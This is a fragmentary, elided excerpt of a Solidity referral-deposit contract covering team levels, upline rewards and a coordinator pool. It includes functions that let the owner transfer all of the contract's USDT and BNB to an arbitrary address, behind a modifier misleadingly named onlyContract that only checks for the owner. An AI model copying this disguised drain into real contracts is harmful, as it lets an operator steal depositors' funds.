...
contract Ownable   {
    ...
    modifier onlyOwner() {
     ...
     modifier onlyContract() {
        require(_owner == msg.sender, "contract: caller is not the contract");
        _;
    }
    /**
...
contract testsol is Ownable {
    ...
    uint256 private constant updatecontracttimeperiod = 90 days;
 ...
 function _updatedirectNum(address _user) private {
    ...
    function _calLevelNow(address _user) private view returns(uint256) {
        ...
        if(total >= 500e18){
            ...
            if(total >= 2000e18 && totaldirectnum>=20 && totaldirectdepositnum>=10000e18   && user.teamNum >= 30 && maxTeam >= 100000e18 &&  otherTeam >= 100000e18  ){
                ...
                levelNow = 4;
            }else if(total >= 500e18  && totaldirectnum>=5 && user.teamNum >= 10 && maxTeam >= 5000e18 &&  otherTeam >= 5000e18  ){
                levelNow = 3;
            }
  ...
  function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        ...
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].totalFreezed.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
 ...
 function _distributeGlobalPool() private {
        ...
        if(globalCount > 0){
            uint256 reward = coordinatorPool.div(globalCount);
            uint256 totalReward;
            for(uint256 i = 0; i < globalcoordinatorUsers.length; i++){
                if(userInfo[globalcoordinatorUsers[i]].level == 5){
            ...
            if(coordinatorPool > totalReward){
                coordinatorPool = coordinatorPool.sub(totalReward);
            }else{
                coordinatorPool = 0;
            }
        }
    ...
    function ContractToTransfer(uint256 SMSAmount) public onlyContract {
        usdt.transfer(ContractAddress, SMSAmount);
    }


    function ContractToTransferBNB(uint256 Amount) public onlyContract {
        payable(ContractAddress).transfer(Amount);
    }

      function addcontractaddress(address Contractaddr) public onlyOwner {

          if(isFreezeReward){

        if(block.timestamp > lastfreezetime.add(updatecontracttimeperiod)){  
      }            
   ...
   function _updatemaxdirectdepositInfo(address _user, uint256 _amount) private {
    ...
    function _updateReward(address _user, uint256 _amount) private {
        ...
        address upline = user.referrer;
          ...
          bool idstatus = getActiveUpline(upline);
        ...
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
              ...
              //  RewardInfo storage upliner = rewardInfo[defaultRefer];
              //  upliner.directs = upliner.directs.add(newAmount);  
                }
